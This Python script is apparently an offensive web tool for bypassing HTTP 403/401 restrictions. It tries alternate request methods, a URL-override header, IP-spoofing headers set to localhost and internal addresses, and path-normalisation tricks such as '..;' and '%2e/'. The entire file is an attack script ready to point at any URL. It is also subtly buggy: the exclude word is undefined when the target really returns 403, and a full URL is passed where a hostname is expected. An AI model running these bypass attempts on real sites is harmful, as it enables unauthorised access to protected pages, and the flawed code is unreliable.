import requests
import traceback
import socket
import sys
from header import head
from config import INFO, BYP, LESS

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def post(res): req_p = requests.post(res, verify=False, allow_redirects=False); return req_p.status_code, "post"
def put(res): req_pt = requests.put(res, verify=False, allow_redirects=False); return req_pt.status_code, "put"
def patch(res): req_ptch = requests.patch(res, verify=False, allow_redirects=False); return req_ptch.status_code, "patch"
def options(res): req_o = requests.options(res, verify=False, allow_redirects=False); return req_o.status_code, "options"


def method(res, url):
    """ 
    Try other method 
    Ex: OPTIONS /admin
    """
    print("\033[36m\u251c BYPASS METHODS:\033[0m")
    result_list = []
    for funct in [post, put, patch, options]:
        try:
            result_list.append(funct(res))
        except:
            pass
    for rs, type_r in result_list:
        if rs not in [403, 401, 404, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500]:
            print("  {} Forbidden Bypass with this requests type: {}".format(BYP, type_r))


def original_url(res, page, url):
    # Ex: http://lpage.com/admin header="X-Originating-URL": admin
    header = {
    "X-Originating-URL": page
    }
    print("\033[36m\u251c HEADER:{}\033[0m".format(header))
    req_ou = requests.get(res, verify=False, headers=header, allow_redirects=False, timeout=10)
    if req_ou.status_code not in [403, 401, 404, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500] and not word_exclude in req_ou.text:
        print("  {}[{}] {} Forbidden Bypass with: 'X-Originating-URL: {}' ({}b)".format(BYP, req_ou.status_code, url+page, page, len(req_ou.content)))
    else:
        print("  {}Not bypass".format(LESS))


def IP_authorization(res, url, domain, page):
    # Ex: http://lpage.com/admin header="X-Custom-IP-Authorization": 127.0.0.1
    print("\033[36m\u251c HEADERS Authorization:\033[0m")
    headers_type = [
    "X-Originating-IP", "X-Forwarded", "Forwarded", "Forwarded-For", "Forwarded-For-IP", "X-Forwarder-For", "X-Forwarded-For", "X-Forwarded-For-Original",
    "X-Forwarded-By", "X-Forwarded-Host", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "Client-IP", "Access-Control-Allow-Origin", "Origin",
    "X-Custom-IP-Authorization"
    ]
    try:
        website_ip = socket.gethostbyname(domain)
        ips_type  = [website_ip, "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0", "localhost", "192.168.1.1"]
    except:
        ips_type  = ["127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "localhost", "0.0.0.0", "192.168.1.1"]
    for h in headers_type:
        for ip in ips_type:
            header = {h : ip}
            try:
                req_ip = requests.get(res, verify=False, headers=header, allow_redirects=False, timeout=10)
                if req_ip.status_code not in [403, 401, 404, 421, 429, 400, 408, 503, 405, 428, 412, 666, 500] and not word_exclude in req_ip.text:
                    print("  {}[{}] {} Forbidden Bypass with: {} ({}b)".format(BYP, req_ip.status_code, url+page, header, len(req_ip.content)))
            except Exception:
                pass
                #traceback.print_exc()
            except KeyboardInterrupt:
                print(" {}Canceled by keyboard interrupt (Ctrl-C)".format(INFO))
                sys.exit()
            sys.stdout.write("\033[34m[i] {}:{}\033[0m\r".format(h, ip))
            sys.stdout.write("\033[K")


def tricks_bypass(url, page, req_url):
    print("\033[36m\u251c BYPASS TRICKS:\033[0m")
    payl = [page+"/.", "/"+page+"/", "./"+page+"/./", "%2e/"+page, page+"/.;/", ".;/"+page, page+"..;", page+"/;/", page+"..%3B",
    page+"/%3B", page+".%3B/"] #http://exemple.com/+page+bypass
    len_req_url = len(req_url.content)
    ranges = range(len_req_url - 50, len_req_url + 50) if len_req_url < 100000 else range(len_req_url - 1000, len_req_url + 1000)
    for p in payl:
        url_b = url + p
        try:
            req_payload = requests.get(url_b, verify=False, allow_redirects=False, timeout=10)
            #print(req_payload.status_code) #DEBUG
            #print("{}:{}".format(len(req_payload.content), len(req_url.content))) #DEBUG
            if req_payload.status_code not in [403, 401, 404, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500] and len(req_payload.content) not in ranges and not word_exclude in req_payload.text:
                print("  {}[{}] Forbidden Bypass with : {} ({}b)".format(BYP, req_payload.status_code, url_b, len(req_payload.content)))
        except KeyboardInterrupt:
            print(" {}Canceled by keyboard interrupt (Ctrl-C)".format(INFO))
            sys.exit()
        sys.stdout.write("\033[34m[i] {}\033[0m\r".format(url_b))


def run_modules(res, url, domain, page, req_url):
    original_url(res, page, url)
    IP_authorization(res, url, domain, page)
    method(res, url)
    tricks_bypass(url, page, req_url)


def bypass_forbidden(res):
    """
    Bypass_forbidden: function for try to bypass code response 403/forbidden
    """
    res_page = res.split("/")[3:]
    url_split = res.split("/")[:3]
    url = "/".join(url_split) + "/"
    page = "/".join(res_page) if len(res_page) > 1 else "".join(res_page)
    domain =  "/".join(res.split("/")[:3]) + "/"
    req_res = requests.get(res, verify=False, timeout=3)
    req_url = requests.get(url, verify=False, timeout=3)
    if req_res.status_code in [403, 401]:
        run_modules(res, url, domain, page, req_url)
    else:
        verif = input(" The page dosn't seem to be forbidden, do you want continue ? [y:n] ")
        if verif in ["y","Y"]:
            global word_exclude
            word_exclude = input(" Please enter an exclude word to defined the page changement: ")
            print("")
            run_modules(res, url, domain, page, req_url)
        else:
            sys.exit()


if __name__ == '__main__':
    head()
    res = sys.argv[1]
    bypass_forbidden(res)
